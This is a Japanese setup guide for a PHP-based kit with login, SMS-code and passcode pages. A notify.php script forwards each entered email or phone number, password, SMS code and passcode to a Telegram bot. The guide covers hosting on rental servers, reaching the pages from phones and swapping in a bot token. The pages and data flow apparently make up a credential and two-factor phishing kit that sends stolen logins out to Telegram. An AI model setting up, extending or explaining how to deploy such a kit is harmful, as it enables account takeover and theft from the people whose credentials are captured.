# 🚀 PHP版セットアップガイド

## 📋 概要
PHPを使用してTelegram通知機能を実装しています。
管理画面（許可/拒否）の機能は廃止し、シンプルに情報をTelegramに通知するだけです。

---

## 🔧 セットアップ手順

### ステップ1️⃣: PHPサーバーを用意

#### オプション A: ローカルPHPサーバー（推奨）
```bash
php -S localhost:8000
```

または、別のポートを使用：
```bash
php -S 0.0.0.0:8000
```

#### オプション B: Apache/Nginx
- `notify.php` をウェブサーバーのドキュメントルートに配置
- HTMLファイルも同じディレクトリに配置

#### オプション C: レンタルサーバー
- FTPで `notify.php` と HTML ファイルをアップロード

---

## 📁 ファイル構成

```
プロジェクトフォルダ/
├── notify.php                ⭐ Telegram通知用PHPスクリプト
├── login.html                ログイン画面
├── sms-verification.html     SMS認証画面
├── passcode-confirm.html     パスコード確認画面
└── admin.html                管理画面（オプション）
```

---

## ✅ テスト方法

### ローカルPHPサーバーの場合：

**1. サーバーを起動**
```bash
php -S localhost:8000
```

**2. ブラウザで開く**
```
http://localhost:8000/login.html
```

**3. ログイン情報を入力**
- メールアドレス
- パスワード

**4. 「ログイン」をクリック**

**5. ターミナルで確認**
```
✅ Telegram通知送信成功
```

**6. Telegramで通知を確認** 📱

---

## 📱 Androidからのアクセス

### PC側でIPアドレスを確認
```bash
# Windowsの場合
ipconfig

# Macの場合
ifconfig

# Linuxの場合
ip addr show
```

### Androidで以下にアクセス
```
http://{PCのIPアドレス}:8000/login.html
```

例：
```
http://192.168.1.100:8000/login.html
```

---

## 🔔 通知内容

### 📧 ログイン情報
```
📧 ログインリクエスト
メール/電話: user@example.com
パスワード: ****
セッションID: 1234567890
時刻: 2024-01-15 12:34:56
```

### 📱 SMS認証コード
```
📱 SMS認証リクエスト
認証コード: 123456
セッションID: 1234567890
時刻: 2024-01-15 12:35:00
```

### 🔐 パスコード認証
```
🔐 パスコード認証リクエスト
セッションID: 1234567890
パスコード: ****
時刻: 2024-01-15 12:35:30
```

---

## 🐛 トラブルシューティング

### ❌ Telegramに通知が届かない

**原因1: notify.phpのパスが間違っている**
- HTMLファイルと同じディレクトリに `notify.php` があるか確認

**原因2: PHPが正しく動作していない**
```bash
# PHPのバージョン確認
php --version

# PHPがインストールされているか確認
which php
```

**原因3: ファイアウォールがブロック**
- PC側のファイアウォール設定を確認

### ❌ ブラウザコンソールにエラー

**F12キーで開発者ツールを開いて確認**
```
CORS エラー → notify.php に Access-Control-Allow-Origin が設定されているか確認
404 エラー → notify.php が同じフォルダにあるか確認
```

### ❌ PHPエラー

**以下を確認:**
```
- curl 拡張が有効か
- allow_url_fopen が有効か
- SSL証明書の検証エラー
```

---

## 🔧 カスタマイズ

### Telegramのボットトークンを変更

`notify.php` の以下を編集：
```php
$TELEGRAM_TOKEN = 'あなたのトークン';
$TELEGRAM_CHAT_ID = 'あなたのChatID';
```

### ポート番号を変更

```bash
# ポート3000で起動
php -S 0.0.0.0:3000
```

### サーバーURLを固定したい

HTMLファイルの以下を編集：
```javascript
const phpUrl = 'http://example.com/notify.php';
```

---

## 📊 ログ機能の追加（オプション）

`notify.php` を以下のように修正して、ログファイルに保存：

```php
// ファイルにログを記録
$logFile = 'telegram_notifications.log';
$logMessage = date('Y-m-d H:i:s') . ' - ' . $message . "\n";
file_put_contents($logFile, $logMessage, FILE_APPEND);
```

---

## 🔐 セキュリティ推奨事項

### 本番環境での対策

1. **環境変数を使用**
```php
$TELEGRAM_TOKEN = getenv('TELEGRAM_TOKEN');
$TELEGRAM_CHAT_ID = getenv('TELEGRAM_CHAT_ID');
```

2. **リクエスト検証を追加**
```php
// IP制限
if (!in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '192.168.1.x'])) {
    http_response_code(403);
    exit;
}
```

3. **HTTPSを使用**
- レンタルサーバーでSSL証明書を設定

4. **データベース連携**
- ログをデータベースに保存

---

## 📞 よくある質問

### Q: 管理画面（許可/拒否）は？
**A:** PHPバージョンでは廃止されました。情報を通知するだけです。

### Q: 複数のチャットに通知できる？
**A:** `notify.php` を複数作成して、各HTMLファイルで異なるPHPファイルを呼び出すことで可能です。

### Q: レンタルサーバーで使える？
**A:** はい。PHPが使えるレンタルサーバーなら使用可能です。

### Q: スマートフォンからアクセスできる？
**A:** はい。PC と同じWi-Fi に接続すれば OK です。

---

## 🎯 まとめ

**PHPバージョンの特徴：**
- ✅ シンプル（コールバック機能なし）
- ✅ 軽量（Node.jsサーバー不要）
- ✅ レンタルサーバーで実行可能
- ✅ Android対応
- ✅ 素早い通知送信

---

すべての機能がダウンロード可能です！🎉
